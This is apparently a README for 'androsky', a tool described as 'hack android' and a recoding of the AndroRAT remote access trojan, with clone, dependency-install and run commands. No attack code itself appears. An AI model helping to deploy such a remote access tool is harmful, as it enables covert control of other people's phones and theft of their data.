# androsky
hack android

androsky is androRAT recoded see the original here : (https://github.com/karma9874/AndroRAT)

## Installation
```
git clone https://github.com/zulfi0/androsky.git
python -m pip install colorama
apt install openjdk-8-jdk 
```
## how to run
simply type
```
python3 sky.py
```
